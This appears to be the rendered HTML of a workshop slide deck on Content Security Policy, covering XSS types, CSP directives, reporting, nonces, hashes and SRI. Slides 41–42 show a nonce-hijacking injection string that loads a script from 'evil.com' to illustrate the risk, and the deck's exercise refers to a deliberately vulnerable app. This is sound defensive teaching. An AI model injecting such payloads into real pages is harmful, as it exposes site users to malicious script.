<h1 id="terms-to-help-organize-types-of-xss---2--2">Terms to help organize types of XSS - 2 / 2</h1>
<table>
<thead>
<tr>
<th>XSS</th>
<th>Server</th>
<th>Client</th>
</tr>
</thead>
<tbody>
<tr>
<td>Stored</td>
<td>Stored Server XSS</td>
<td>Stored Client XSS</td>
</tr>
<tr>
<td>Reflected</td>
<td>Reflected Server XSS</td>
<td>Reflected Client XSS</td>
</tr>
</tbody>
</table>
<footer>AppSec Workshop - Content Security Policies</footer>
</section>
</foreignObject></svg><svg data-marpit-svg="" viewBox="0 0 1280 720"><foreignObject width="1280" height="720"><section id="23" data-footer="AppSec Workshop - Content Security Policies" data-paginate="true" data-theme="bouvet" data-marpit-pagination="23" style="--footer:AppSec Workshop - Content Security Policies;--paginate:true;--theme:bouvet;" data-marpit-pagination-total="51" data-size="16:9">
<h1 id="how-can-we-use-csp-to-mitigate-xss">How can we use CSP to mitigate XSS</h1>
<h5 id="http-headers">HTTP Headers</h5>
<p><code>HTTP headers</code> let the client and the server pass additional information with an HTTP request or response.</p>
<ul>
<li><code>Request headers</code> contain more information about the resource to be fetched, or about the client requesting the resource.</li>
<li><code>Response headers</code> hold additional information about the response, like its location or about the server providing it.</li>
</ul>
<footer>AppSec Workshop - Content Security Policies</footer>
</section>
</foreignObject></svg><svg data-marpit-svg="" viewBox="0 0 1280 720"><foreignObject width="1280" height="720"><section id="24" data-footer="AppSec Workshop - Content Security Policies" data-paginate="true" data-theme="bouvet" data-marpit-pagination="24" style="--footer:AppSec Workshop - Content Security Policies;--paginate:true;--theme:bouvet;" data-marpit-pagination-total="51" data-size="16:9">
<h1 id="http-response-headers--controls-csp-directives">HTTP Response headers -controls CSP directives</h1>
<p>HTTP response headers<br /><code>Content-Security-Policy: &lt;policy-directive&gt;; &lt;policy-directive&gt;</code></p>
<p><code>Content-Security-Policy-Report-Only</code> header is useful for reporting, instead of only restricting. Useful for testing your webapp with CSPs.</p>
<footer>AppSec Workshop - Content Security Policies</footer>
</section>
</foreignObject></svg><svg data-marpit-svg="" viewBox="0 0 1280 720"><foreignObject width="1280" height="720"><section id="25" data-footer="AppSec Workshop - Content Security Policies" data-paginate="true" data-theme="bouvet" data-marpit-pagination="25" style="--footer:AppSec Workshop - Content Security Policies;--paginate:true;--theme:bouvet;" data-marpit-pagination-total="51" data-size="16:9">
<h1 id="content-security-policy---example">Content-Security-Policy - example</h1>
<p>HTML Example:</p>
<pre is="marp-pre" data-auto-scaling="downscale-only"><code class="language-html"><span class="hljs-tag">&lt;<span class="hljs-name">meta</span> <span class="hljs-attr">http-equiv</span>=<span class="hljs-string">&quot;Content-Security-Policy&quot;</span> <span class="hljs-attr">content</span>=<span class="hljs-string">&quot;default-src `none`;&quot;</span>&gt;</span>
</code></pre>
<p>Python using Flask example:</p>
<pre is="marp-pre" data-auto-scaling="downscale-only"><code class="language-python">response.headers[<span class="hljs-string">&#x27;Content-Security-Policy&#x27;</span>] = <span class="hljs-string">&quot;default-src &#x27;none&#x27;;&quot;</span>
response.headers[<span class="hljs-string">&#x27;Content-Security-Policy-Report-Only&#x27;</span>] = <span class="hljs-string">&quot;default-src &#x27;none&#x27;;&quot;</span>

</code></pre>
<footer>AppSec Workshop - Content Security Policies</footer>
</section>
</foreignObject></svg><svg data-marpit-svg="" viewBox="0 0 1280 720"><foreignObject width="1280" height="720"><section id="26" data-footer="AppSec Workshop - Content Security Policies" data-paginate="true" data-class="lead" data-theme="bouvet" class="lead" data-marpit-pagination="26" style="--footer:AppSec Workshop - Content Security Policies;--paginate:true;--class:lead;--theme:bouvet;" data-marpit-pagination-total="51" data-size="16:9">
<h1 id="explore-csp-directives">Explore CSP directives</h1>
<h1 id="default-src---script-srcbrstyle-src---font-src---img-src"><code>default-src</code> - <code>script-src</code><br /><code>style-src</code> - <code>font-src</code> - <code>img-src</code></h1>
<footer>AppSec Workshop - Content Security Policies</footer>
</section>
</foreignObject></svg><svg data-marpit-svg="" viewBox="0 0 1280 720"><foreignObject width="1280" height="720"><section id="27" data-footer="AppSec Workshop - Content Security Policies" data-paginate="true" data-theme="bouvet" data-marpit-pagination="27" style="--footer:AppSec Workshop - Content Security Policies;--paginate:true;--theme:bouvet;" data-marpit-pagination-total="51" data-size="16:9">
<h1 id="directive--default-src">Directive : <code>default-src</code></h1>
<p>If a <a href="https://www.w3.org/TR/CSP3/#directive-default-src"><code>default-src</code></a> directive is present in a policy, its value will be used as the policy’s default source list. That is, given <code>default-src 'none';</code> <code>script-src 'self'</code>, script requests will use <code>'self'</code> as the source list to match against. Other requests will use <code>'none'</code>.</p>
<p>Example:</p>
<pre is="marp-pre" data-auto-scaling="downscale-only"><code class="language-python">response.headers[<span class="hljs-string">&#x27;Content-Security-Policy&#x27;</span>] = <span class="hljs-string">&quot;default-src &#x27;none&#x27;;&quot;</span>
</code></pre>
<footer>AppSec Workshop - Content Security Policies</footer>
</section>
</foreignObject></svg><svg data-marpit-svg="" viewBox="0 0 1280 720"><foreignObject width="1280" height="720"><section id="28" data-footer="AppSec Workshop - Content Security Policies" data-paginate="true" data-theme="bouvet" data-marpit-pagination="28" style="--footer:AppSec Workshop - Content Security Policies;--paginate:true;--theme:bouvet;" data-marpit-pagination-total="51" data-size="16:9">
<h1 id="directive--script-src">Directive : <code>script-src</code></h1>
<p>The <a href="https://www.w3.org/TR/CSP3/#directive-script-src">script-src</a> directive restricts the locations from which scripts may be executed. This includes not only URLs loaded directly into script elements, but also things like inline script blocks and XSLT stylesheets [XSLT] which can trigger script execution.</p>
<p>Example:</p>
<pre is="marp-pre" data-auto-scaling="downscale-only"><code class="language-python">response.headers[<span class="hljs-string">&#x27;Content-Security-Policy&#x27;</span>] = <span class="hljs-string">&quot;default-src &#x27;none&#x27;; script-src &#x27;self&#x27; https://js.bouvet.no &lt;other_source&gt;;&quot;</span>
</code></pre>
<footer>AppSec Workshop - Content Security Policies</footer>
</section>
</foreignObject></svg><svg data-marpit-svg="" viewBox="0 0 1280 720"><foreignObject width="1280" height="720"><section id="29" data-footer="AppSec Workshop - Content Security Policies" data-paginate="true" data-theme="bouvet" data-marpit-pagination="29" style="--footer:AppSec Workshop - Content Security Policies;--paginate:true;--theme:bouvet;" data-marpit-pagination-total="51" data-size="16:9">
<h1 id="directive--style-src">Directive : <code>style-src</code></h1>
<p>The <a href="https://www.w3.org/TR/CSP3/#directive-style-src">style-src</a> directive restricts the locations from which style may be applied to a <a href="https://dom.spec.whatwg.org/#document">Document</a>.</p>
<p>Example:</p>
<pre is="marp-pre" data-auto-scaling="downscale-only"><code class="language-python">response.headers[<span class="hljs-string">&#x27;Content-Security-Policy&#x27;</span>] = <span class="hljs-string">&quot;default-src &#x27;none&#x27;; style-src &#x27;self&#x27; https://css.bouvet.no &lt;other_source&gt;;&quot;</span>
</code></pre>
<footer>AppSec Workshop - Content Security Policies</footer>
</section>
</foreignObject></svg><svg data-marpit-svg="" viewBox="0 0 1280 720"><foreignObject width="1280" height="720"><section id="30" data-footer="AppSec Workshop - Content Security Policies" data-paginate="true" data-theme="bouvet" data-marpit-pagination="30" style="--footer:AppSec Workshop - Content Security Policies;--paginate:true;--theme:bouvet;" data-marpit-pagination-total="51" data-size="16:9">
<h1 id="directive--font-src">Directive : <code>font-src</code></h1>
<p>The <a href="https://www.w3.org/TR/CSP3/#directive-font-src">font-src</a> directive specifies valid sources for fonts loaded using <code>@font-face</code>.</p>
<p>Example:</p>
<pre is="marp-pre" data-auto-scaling="downscale-only"><code class="language-python">response.headers[<span class="hljs-string">&#x27;Content-Security-Policy&#x27;</span>] = <span class="hljs-string">&quot;default-src &#x27;none&#x27;; script-src &#x27;self&#x27;; style-src &#x27;self&#x27;; font-src &#x27;self&#x27; https://fonts.bouvet.no &lt;other_source&gt;; &quot;</span>
</code></pre>
<footer>AppSec Workshop - Content Security Policies</footer>
</section>
</foreignObject></svg><svg data-marpit-svg="" viewBox="0 0 1280 720"><foreignObject width="1280" height="720"><section id="31" data-footer="AppSec Workshop - Content Security Policies" data-paginate="true" data-theme="bouvet" data-marpit-pagination="31" style="--footer:AppSec Workshop - Content Security Policies;--paginate:true;--theme:bouvet;" data-marpit-pagination-total="51" data-size="16:9">
<h1 id="directive--img-src">Directive : <code>img-src</code></h1>
<p>The <a href="https://www.w3.org/TR/CSP3/#directive-img-src">img-src</a> directive restricts the URLs from which image resources may be loaded.</p>
<p>Example:</p>
<pre is="marp-pre" data-auto-scaling="downscale-only"><code class="language-python">response.headers[<span class="hljs-string">&#x27;Content-Security-Policy&#x27;</span>] = <span class="hljs-string">&quot;default-src &#x27;none&#x27;; img-src &#x27;self&#x27; https://images.bouvet.no &lt;other_source&gt;; &quot;</span>
</code></pre>
<footer>AppSec Workshop - Content Security Policies</footer>
</section>
</foreignObject></svg><svg data-marpit-svg="" viewBox="0 0 1280 720"><foreignObject width="1280" height="720"><section id="32" data-footer="AppSec Workshop - Content Security Policies" data-paginate="true" data-class="lead" data-theme="bouvet" class="lead" data-marpit-pagination="32" style="--footer:AppSec Workshop - Content Security Policies;--paginate:true;--class:lead;--theme:bouvet;" data-marpit-pagination-total="51" data-size="16:9">
<h1 id="explore-directivebrconnect-src---media-src">Explore directive<br /><code>connect-src</code> - <code>media-src</code></h1>
<footer>AppSec Workshop - Content Security Policies</footer>
</section>
</foreignObject></svg><svg data-marpit-svg="" viewBox="0 0 1280 720"><foreignObject width="1280" height="720"><section id="33" data-footer="AppSec Workshop - Content Security Policies" data-paginate="true" data-theme="bouvet" data-marpit-pagination="33" style="--footer:AppSec Workshop - Content Security Policies;--paginate:true;--theme:bouvet;" data-marpit-pagination-total="51" data-size="16:9">
<h1 id="directive--connect-src">Directive : <code>connect-src</code></h1>
<p>The <a href="https://www.w3.org/TR/CSP3/#directive-connect-src">connect-src</a> directive restricts the URLs which can be loaded using script interfaces. The APIs that are restricted are:<br />
<code>&lt;a&gt; ping</code> - <code>fetch()</code> - <code>XMLHttpRequest</code> - <code>WebSocket</code> - <code>EventSource</code> and <code>Navigator.sendBeacon()</code></p>
<p>Example:</p>
<pre is="marp-pre" data-auto-scaling="downscale-only"><code class="language-python">response.headers[<span class="hljs-string">&#x27;Content-Security-Policy&#x27;</span>] = <span class="hljs-string">&quot;default-src &#x27;none&#x27;; connect-src &#x27;self&#x27; https://*.bouvet.no &lt;other_source&gt;;&quot;</span>
</code></pre>
<footer>AppSec Workshop - Content Security Policies</footer>
</section>
</foreignObject></svg><svg data-marpit-svg="" viewBox="0 0 1280 720"><foreignObject width="1280" height="720"><section id="34" data-footer="AppSec Workshop - Content Security Policies" data-paginate="true" data-theme="bouvet" data-marpit-pagination="34" style="--footer:AppSec Workshop - Content Security Policies;--paginate:true;--theme:bouvet;" data-marpit-pagination-total="51" data-size="16:9">
<h1 id="directive--media-src">Directive : <code>media-src</code></h1>
<p>The <a href="https://www.w3.org/TR/CSP3/#directive-media-src">media-src</a> directive restricts the URLs from which <code>&lt;video&gt;</code>, <code>&lt;audio&gt;</code>, and associated text track resources may be loaded.</p>
<p>Example:</p>
<pre is="marp-pre" data-auto-scaling="downscale-only"><code class="language-python">response.headers[<span class="hljs-string">&#x27;Content-Security-Policy&#x27;</span>] = <span class="hljs-string">&quot;default-src &#x27;none&#x27;; media-src &#x27;self&#x27; https://video.bouvet.no https://audio.bouvet.no &lt;other_source&gt;;&quot;</span>
</code></pre>
<footer>AppSec Workshop - Content Security Policies</footer>
</section>
</foreignObject></svg><svg data-marpit-svg="" viewBox="0 0 1280 720"><foreignObject width="1280" height="720"><section id="35" data-footer="AppSec Workshop - Content Security Policies" data-paginate="true" data-class="lead" data-theme="bouvet" class="lead" data-marpit-pagination="35" style="--footer:AppSec Workshop - Content Security Policies;--paginate:true;--class:lead;--theme:bouvet;" data-marpit-pagination-total="51" data-size="16:9">
<h1 id="reporting-violations-of-directivesbrreport-uri--report-to">Reporting violations of directives<br /><code>report-uri</code> / <code>report-to</code></h1>
<footer>AppSec Workshop - Content Security Policies</footer>
</section>
</foreignObject></svg><svg data-marpit-svg="" viewBox="0 0 1280 720"><foreignObject width="1280" height="720"><section id="36" data-footer="AppSec Workshop - Content Security Policies" data-paginate="true" data-theme="bouvet" data-marpit-pagination="36" style="--footer:AppSec Workshop - Content Security Policies;--paginate:true;--theme:bouvet;" data-marpit-pagination-total="51" data-size="16:9">
<h1 id="directive--report-uri--report-to">Directive : <code>report-uri</code> / <code>report-to</code></h1>
<p><a href="https://www.w3.org/TR/CSP3/#directive-report-uri">report-uri</a> is deprecated. However not all browsers support the new directive <a href="https://www.w3.org/TR/CSP3/#directive-report-to">report-to</a>, thus is ok to include both to support past and future browsers.</p>
<p>The <a href="https://www.w3.org/TR/CSP3/#directive-report-to">report-to</a> directive defines a reporting endpoint to which violation reports ought to be sent. The endpoint must serve through the <code>https</code> protocol.</p>
<footer>AppSec Workshop - Content Security Policies</footer>
</section>
</foreignObject></svg><svg data-marpit-svg="" viewBox="0 0 1280 720"><foreignObject width="1280" height="720"><section id="37" data-footer="AppSec Workshop - Content Security Policies" data-paginate="true" data-theme="bouvet" data-marpit-pagination="37" style="--footer:AppSec Workshop - Content Security Policies;--paginate:true;--theme:bouvet;" data-marpit-pagination-total="51" data-size="16:9">
<p><code>report-to</code> example:</p>
<pre is="marp-pre" data-auto-scaling="downscale-only"><code class="language-python">response.headers[<span class="hljs-string">&#x27;Reporting-Endpoints&#x27;</span>] = <span class="hljs-string">&quot;main-endpoint=&#x27;https://bouvet.no/csp-reports&#x27;;&quot;</span>

response.headers[<span class="hljs-string">&#x27;Content-Security-Policy&#x27;</span>] = <span class="hljs-string">&quot;default-src &#x27;none&#x27;; script-src &#x27;self&#x27;; style-src &#x27;self&#x27;; report-to: main-endpoint;&quot;</span>

response.headers[<span class="hljs-string">&#x27;Content-Security-Policy&#x27;</span>] = <span class="hljs-string">&quot;default-src &#x27;none&#x27;; report-uri https://bouvet.no/csp-reports;&quot;</span>

</code></pre>
<footer>AppSec Workshop - Content Security Policies</footer>
</section>
</foreignObject></svg><svg data-marpit-svg="" viewBox="0 0 1280 720"><foreignObject width="1280" height="720"><section id="38" data-footer="AppSec Workshop - Content Security Policies" data-paginate="true" data-theme="bouvet" data-marpit-pagination="38" style="--footer:AppSec Workshop - Content Security Policies;--paginate:true;--theme:bouvet;" data-marpit-pagination-total="51" data-size="16:9">
<p>Example of violation report by the <code>report-to</code> directive</p>
<pre is="marp-pre" data-auto-scaling="downscale-only"><code class="language-json"><span class="hljs-punctuation">[</span><span class="hljs-punctuation">{</span>
  <span class="hljs-attr">&quot;age&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-number">0</span><span class="hljs-punctuation">,</span>
  <span class="hljs-attr">&quot;body&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-punctuation">{</span>
	<span class="hljs-attr">&quot;blockedURL&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;https://csplite.com/tst/media/7_del.png&quot;</span><span class="hljs-punctuation">,</span>
	<span class="hljs-attr">&quot;disposition&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;enforce&quot;</span><span class="hljs-punctuation">,</span>
	<span class="hljs-attr">&quot;documentURL&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;https://csplite.com/tst/test_frame.php?ID=229&amp;hash=da964209653e467d337313e51876e27d&quot;</span><span class="hljs-punctuation">,</span>
	<span class="hljs-attr">&quot;effectiveDirective&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;img-src&quot;</span><span class="hljs-punctuation">,</span>
	<span class="hljs-attr">&quot;lineNumber&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-number">9</span><span class="hljs-punctuation">,</span>
	<span class="hljs-attr">&quot;originalPolicy&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;default-src &#x27;none&#x27;; report-to endpoint-csp;&quot;</span><span class="hljs-punctuation">,</span>
	<span class="hljs-attr">&quot;referrer&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;https://csplite.com/test229/&quot;</span><span class="hljs-punctuation">,</span>
	<span class="hljs-attr">&quot;sourceFile&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;https://csplite.com/tst/test_frame.php?ID=229&amp;hash=da964209653e467d337313e51876e27d&quot;</span><span class="hljs-punctuation">,</span>
	<span class="hljs-attr">&quot;statusCode&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-number">0</span>
	<span class="hljs-punctuation">}</span><span class="hljs-punctuation">,</span>
  <span class="hljs-attr">&quot;type&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;csp-violation&quot;</span><span class="hljs-punctuation">,</span>
  <span class="hljs-attr">&quot;url&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;https://csplite.com/tst/test_frame.php?ID=229&amp;hash=da964209653e467d337313e51876e27d&quot;</span><span class="hljs-punctuation">,</span>
  <span class="hljs-attr">&quot;user_agent&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.88 Safari/537.36&quot;</span>
<span class="hljs-punctuation">}</span><span class="hljs-punctuation">]</span>
</code></pre>
<footer>AppSec Workshop - Content Security Policies</footer>
</section>
</foreignObject></svg><svg data-marpit-svg="" viewBox="0 0 1280 720"><foreignObject width="1280" height="720"><section id="39" data-footer="AppSec Workshop - Content Security Policies" data-paginate="true" data-class="lead" data-theme="bouvet" class="lead" data-marpit-pagination="39" style="--footer:AppSec Workshop - Content Security Policies;--paginate:true;--class:lead;--theme:bouvet;" data-marpit-pagination-total="51" data-size="16:9">
<h1 id="nonce-and-hashes">Nonce and hashes</h1>
<footer>AppSec Workshop - Content Security Policies</footer>
</section>
</foreignObject></svg><svg data-marpit-svg="" viewBox="0 0 1280 720"><foreignObject width="1280" height="720"><section id="40" data-footer="AppSec Workshop - Content Security Policies" data-paginate="true" data-theme="bouvet" data-marpit-pagination="40" style="--footer:AppSec Workshop - Content Security Policies;--paginate:true;--theme:bouvet;" data-marpit-pagination-total="51" data-size="16:9">
<h1 id="nonce---inline-script">Nonce - Inline script</h1>
<p>Allowing all inline scripts is considered a security risk, so it's recommended to use a nonce-source or a hash-source instead. It is important to note, this nonce value needs to be dynamically generated as it has to be unique for each HTTP request.</p>
<pre is="marp-pre" data-auto-scaling="downscale-only"><code>&lt;script nonce=&quot;2726c7f26c&quot;&gt;
  const inline = 1;
  // …
&lt;/script&gt;
</code></pre>
<p><code>Content-Security-Policy: script-src 'nonce-2726c7f26c'</code></p>
<footer>AppSec Workshop - Content Security Policies</footer>
</section>
</foreignObject></svg><svg data-marpit-svg="" viewBox="0 0 1280 720"><foreignObject width="1280" height="720"><section id="41" data-marpit-fragments="2" data-footer="AppSec Workshop - Content Security Policies" data-paginate="true" data-theme="bouvet" data-marpit-pagination="41" style="--footer:AppSec Workshop - Content Security Policies;--paginate:true;--theme:bouvet;" data-marpit-pagination-total="51" data-size="16:9">
<h1 id="nonce---hijacking"><a href="https://www.w3.org/TR/CSP3/#security-nonce-hijacking">Nonce - hijacking</a></h1>
<ul>
<li data-marpit-fragment="1">
<p>Your code :<br />
<code>Content-Security-Policy: script-src 'nonce-abc'</code></p>
<pre is="marp-pre" data-auto-scaling="downscale-only"><code class="language-html"><span class="hljs-tag">&lt;<span class="hljs-name">p</span>&gt;</span>Hello, [INJECTION POINT]<span class="hljs-tag">&lt;/<span class="hljs-name">p</span>&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">script</span> <span class="hljs-attr">nonce</span>=<span class="hljs-string">&quot;abc&quot;</span> <span class="hljs-attr">src</span>=<span class="hljs-string">&quot;/good.js&quot;</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span>
</code></pre>
</li>
<li data-marpit-fragment="2">
<p>If an attacker injects the string</p>
<pre is="marp-pre" data-auto-scaling="downscale-only"><code class="language-html">&quot;<span class="hljs-tag">&lt;<span class="hljs-name">script</span> <span class="hljs-attr">src</span>=<span class="hljs-string">&#x27;https://evil.com/evil.js&#x27;</span> &quot;  
</span></code></pre>
</li>
</ul>
<footer>AppSec Workshop - Content Security Policies</footer>
</section>
</foreignObject></svg><svg data-marpit-svg="" viewBox="0 0 1280 720"><foreignObject width="1280" height="720"><section id="42" data-footer="AppSec Workshop - Content Security Policies" data-paginate="true" data-theme="bouvet" data-marpit-pagination="42" style="--footer:AppSec Workshop - Content Security Policies;--paginate:true;--theme:bouvet;" data-marpit-pagination-total="51" data-size="16:9">
<ul>
<li>
<p>then the browser will receive the following:</p>
<pre is="marp-pre" data-auto-scaling="downscale-only"><code class="language-html"><span class="hljs-tag">&lt;<span class="hljs-name">p</span>&gt;</span>Hello, <span class="hljs-tag">&lt;<span class="hljs-name">script</span> <span class="hljs-attr">src</span>=<span class="hljs-string">&#x27;https://evil.com/evil.js&#x27;</span> &lt;/<span class="hljs-attr">p</span>&gt;</span><span class="language-handlebars"><span class="language-xml">
<span class="hljs-tag">&lt;<span class="hljs-name">script</span> <span class="hljs-attr">nonce</span>=<span class="hljs-string">&quot;abc&quot;</span> <span class="hljs-attr">src</span>=<span class="hljs-string">&quot;/good.js&quot;</span>&gt;</span></span></span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span>
</code></pre>
</li>
</ul>
<p>It will then parse that code, ending up with a script element with a <code>src</code> attribute pointing to a malicious payload, an attribute named <code>&lt;/p&gt;</code>, an attribute named <code>&quot;&lt;script&quot;</code>, a nonce attribute, and a second src attribute which is helpfully discarded as duplicate by the parser.</p>
<footer>AppSec Workshop - Content Security Policies</footer>
</section>
</foreignObject></svg><svg data-marpit-svg="" viewBox="0 0 1280 720"><foreignObject width="1280" height="720"><section id="43" data-footer="AppSec Workshop - Content Security Policies" data-paginate="true" data-theme="bouvet" data-marpit-pagination="43" style="--footer:AppSec Workshop - Content Security Policies;--paginate:true;--theme:bouvet;" data-marpit-pagination-total="51" data-size="16:9">
<h1 id="hashes">Hashes</h1>
<p>Alternatively, you can create hashes from your inline scripts. CSP supports sha256, sha384 and sha512.</p>
<pre is="marp-pre" data-auto-scaling="downscale-only"><code>&lt;script&gt;
  const inline = 1;
&lt;/script&gt;
</code></pre>
<p><code>echo -n 'const inline = 1;' | openssl sha256 -binary | openssl base64</code></p>
<p><code>Content-Security-Policy: script-src 'sha256-2XA6OeWgx7rumjOswMWkHzvY7xYWT9JsRykQhkmJXi0='</code></p>
<footer>AppSec Workshop - Content Security Policies</footer>
</section>
</foreignObject></svg><svg data-marpit-svg="" viewBox="0 0 1280 720"><foreignObject width="1280" height="720"><section id="44" data-footer="AppSec Workshop - Content Security Policies" data-paginate="true" data-theme="bouvet" data-marpit-pagination="44" style="--footer:AppSec Workshop - Content Security Policies;--paginate:true;--theme:bouvet;" data-marpit-pagination-total="51" data-size="16:9">
<h1 id="generic-unsafe-policy">Generic Unsafe Policy</h1>
<p>By default Content Security Policy does not allow inline javascript.</p>
<ul>
<li>No directly embed javascript will work</li>
<li>Why - most client side attacks involve maliciously injecting javascript into HTML</li>
</ul>
<p>You can relax this restriction by including the <code>unsafe-inline</code> and/or <code>unsafe-eval</code> keyword in your <code>script-src</code> and/or <code>style-src</code></p>
<p><img class="emoji" draggable="false" alt="❗️" src="https://cdn.jsdelivr.net/gh/jdecked/twemoji@14.1.2/assets/svg/2757.svg" data-marp-twemoji=""/>This defeats the purpose of CSP<img class="emoji" draggable="false" alt="❗️" src="https://cdn.jsdelivr.net/gh/jdecked/twemoji@14.1.2/assets/svg/2757.svg" data-marp-twemoji=""/></p>
<footer>AppSec Workshop - Content Security Policies</footer>
</section>
</foreignObject></svg><svg data-marpit-svg="" viewBox="0 0 1280 720"><foreignObject width="1280" height="720"><section id="45" data-footer="AppSec Workshop - Content Security Policies" data-paginate="true" data-theme="bouvet" data-marpit-pagination="45" style="--footer:AppSec Workshop - Content Security Policies;--paginate:true;--theme:bouvet;" data-marpit-pagination-total="51" data-size="16:9">
<h1 id="best-practice">Best practice</h1>
<p>.. is ofc not to use inline scripts or styles, but use .js/.css files and hash files for use in CSP.</p>
<p><code>cat ./scripts.js | openssl sha256 -binary | openssl base64</code><br />
<code>cat ./styles.css | openssl sha256 -binary | openssl base64</code></p>
<p><code>Content-Security-Policy: script-src 'sha256-47DEQpj8HBSa+/TImW+5JCeuQeRkm5NMpJWZG3hSuFU='; style-src 'sha256-yFzV7Vvcuayqdtl6O1dkcA1ivVe5RwOH6jLVDn83bfQ='</code></p>
<footer>AppSec Workshop - Content Security Policies</footer>
</section>
</foreignObject></svg><svg data-marpit-svg="" viewBox="0 0 1280 720"><foreignObject width="1280" height="720"><section id="46" data-footer="AppSec Workshop - Content Security Policies" data-paginate="true" data-theme="bouvet" data-marpit-pagination="46" style="--footer:AppSec Workshop - Content Security Policies;--paginate:true;--theme:bouvet;" data-marpit-pagination-total="51" data-size="16:9">
<h1 id="sri-hash---integrity">SRI Hash - <code>integrity</code></h1>
<p>Subresource Integrity (SRI) is a security feature that enables browsers to verify that resources they fetch (for example, from a CDN) are delivered without unexpected manipulation. It works by allowing you to provide a cryptographic hash that a fetched resource must match.</p>
<p><code>&lt;link rel=&quot;stylesheet&quot; href=&quot;https://cdn.jsdelivr.net/npm/bootstrap-icons@1.5.0/font/bootstrap-icons.css&quot; integrity=&quot;sha256-PDJQdTN7dolQWDASIoBVrjkuOEaI137FI15sqI3Oxu8=&quot; crossorigin=&quot;anonymous&quot;&gt;</code></p>
<footer>AppSec Workshop - Content Security Policies</footer>
</section>
</foreignObject></svg><svg data-marpit-svg="" viewBox="0 0 1280 720"><foreignObject width="1280" height="720"><section id="47" data-footer="AppSec Workshop - Content Security Policies" data-paginate="true" data-theme="bouvet" data-marpit-pagination="47" style="--footer:AppSec Workshop - Content Security Policies;--paginate:true;--theme:bouvet;" data-marpit-pagination-total="51" data-size="16:9">
<h1 id="report-uricom">report-uri.com</h1>
<ul>
<li>Tools : <a href="https://report-uri.com/home/tools">https://report-uri.com/home/tools</a></li>
<li>e.g. Scan security headers, Hashing etc</li>
<li>SRI Hashes - <a href="https://report-uri.com/home/sri_hash">https://report-uri.com/home/sri_hash</a></li>
<li>There is also a service for storing your CSP errors for monitoring an analysis, ref. the <code>report-to</code> directive</li>
</ul>
<footer>AppSec Workshop - Content Security Policies</footer>
</section>
</foreignObject></svg><svg data-marpit-svg="" viewBox="0 0 1280 720"><foreignObject width="1280" height="720"><section data-footer="AppSec Workshop - Content Security Policies" data-paginate="true" data-theme="bouvet" data-marpit-pagination="48" style="--footer:AppSec Workshop - Content Security Policies;--paginate:true;--theme:bouvet;" data-marpit-pagination-total="51" data-size="16:9" data-marpit-advanced-background="background"><div data-marpit-advanced-background-container="true" data-marpit-advanced-background-direction="horizontal"><figure style="background-image:url(&quot;./resources/csp_policy3_diagram.png&quot;);background-size:30%;"></figure></div></section></foreignObject><foreignObject width="1280" height="720"><section id="48" data-footer="AppSec Workshop - Content Security Policies" data-paginate="true" data-theme="bouvet" data-marpit-pagination="48" style="--footer:AppSec Workshop - Content Security Policies;--paginate:true;--theme:bouvet;" data-marpit-pagination-total="51" data-size="16:9" data-marpit-advanced-background="content">
<h1 id="mapping---htmljs-features-and-csp-3-controls">Mapping - HTML/JS features and CSP 3 controls</h1>
<footer>AppSec Workshop - Content Security Policies</footer>
</section>
</foreignObject><foreignObject width="1280" height="720" data-marpit-advanced-background="pseudo"><section data-footer="AppSec Workshop - Content Security Policies" data-paginate="true" data-theme="bouvet" data-marpit-pagination="48" style="" data-marpit-pagination-total="51" data-size="16:9" data-marpit-advanced-background="pseudo"></section></foreignObject></svg><svg data-marpit-svg="" viewBox="0 0 1280 720"><foreignObject width="1280" height="720"><section id="49" data-footer="AppSec Workshop - Content Security Policies" data-paginate="true" data-class="lead" data-theme="bouvet" class="lead" data-marpit-pagination="49" style="--footer:AppSec Workshop - Content Security Policies;--paginate:true;--class:lead;--theme:bouvet;" data-marpit-pagination-total="51" data-size="16:9">
<h1 id="applying-directives-to-yourbrexisting-project">Applying directives to your<br />existing project</h1>
<footer>AppSec Workshop - Content Security Policies</footer>
</section>
</foreignObject></svg><svg data-marpit-svg="" viewBox="0 0 1280 720"><foreignObject width="1280" height="720"><section id="50" data-footer="AppSec Workshop - Content Security Policies" data-paginate="true" data-theme="bouvet" data-marpit-pagination="50" style="--footer:AppSec Workshop - Content Security Policies;--paginate:true;--theme:bouvet;" data-marpit-pagination-total="51" data-size="16:9">
<h1 id="restrict-and-then-adjust">Restrict and then adjust</h1>
<ol>
<li>Start with locking down everything<br />
<code>default-src='none';</code></li>
<li>Set the directive to just report errors<br />
<code>Content-Security-Policy-Report-Only: default-src='none';</code></li>
<li>Start adding directives - step by step<br />
<code>script-src</code> , <code>style-src</code>, <code>img-src</code> and <code>font-src</code></li>
<li>Adjust directives iteratively, by interpreting errors in the console log</li>
</ol>
<footer>AppSec Workshop - Content Security Policies</footer>
</section>
</foreignObject></svg><svg data-marpit-svg="" viewBox="0 0 1280 720"><foreignObject width="1280" height="720"><section id="51" data-marpit-scope-p7YEAJwj="" data-footer="AppSec Workshop - Content Security Policies" data-paginate="true" data-theme="bouvet" data-marpit-pagination="51" style="--footer:AppSec Workshop - Content Security Policies;--paginate:true;--theme:bouvet;" data-marpit-pagination-total="51" data-size="16:9">
<h1 id="now-you-and-your-task">Now you and your task</h1>
<ul>
<li>Restrict the url <code>/test</code> page with CSPs</li>
<li>Have a look in the browser console for CSP errors</li>
<li>Code in <code>/app/vuln_app.py</code></li>
<li>Repo : <code>https://github.com/Bouvet-deler/csp-workshop/</code></li>
